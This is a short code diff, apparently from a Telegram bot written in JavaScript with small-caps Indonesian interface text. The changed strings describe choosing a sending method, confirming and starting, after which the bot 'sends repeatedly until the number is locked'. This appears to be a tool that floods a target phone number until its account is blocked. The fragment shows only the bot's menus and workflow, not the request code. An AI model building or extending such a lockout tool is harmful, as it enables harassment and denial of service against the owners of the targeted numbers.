+      `▸ ᴘᴇʀᴀɴɢᴋᴀᴛ ⦂ ${probe.isDeviceOn ? "● ᴏɴ-ᴅᴇᴠɪᴄᴇ" : "○ ᴏꜰꜰ-ᴅᴇᴠɪᴄᴇ"}`,
+      `▸ ꜱɪᴀᴘ ᴋɪʀɪᴍ ⦂ ${available.length ? available.join(" · ") : "ᴛɪᴅᴀᴋ ᴀᴅᴀ"}</blockquote>`,
       "",
       "◈ ᴋᴇᴛᴇʀꜱᴇᴅɪᴀᴀɴ ᴍᴇᴛᴏᴅᴇ",
       `<blockquote>${formatMethodsBlock(methods, probe.isDeviceOn)}</blockquote>`,
       "",
-      "ⓘ ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ → ʙᴏᴛ ᴋɪʀɪᴍ ᴏᴛᴏᴍᴀᴛɪꜱ ꜱᴀᴍᴘᴀɪ ɴᴏᴍᴏʀ ᴍᴀꜱᴜᴋ ꜱᴛᴀᴛᴜꜱ ᴛᴇᴍᴘᴏʀᴀʀʏ."
+      "ⓘ ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ → ᴋᴏɴꜰɪʀᴍᴀꜱɪ → <b>▶ ᴍᴜʟᴀɪ</b>.",
+      "   ʙᴏᴛ ᴀᴋᴀɴ ᴋɪʀɪᴍ ʙᴇʀᴜʟᴀɴɢ ꜱᴀᴍᴘᴀɪ ɴᴏᴍᴏʀ ᴛᴇʀᴋᴜɴᴄɪ.",
+      "   ᴊᴇᴅᴀ ꜱᴇᴍᴇɴᴛᴀʀᴀ ≠ ᴄᴏᴏʟᴅᴏᴡɴ ᴋᴇʀᴀꜱ."
     ].join("\n"), buildSendMethodKeyboard(phone, probe), false);
   }
 
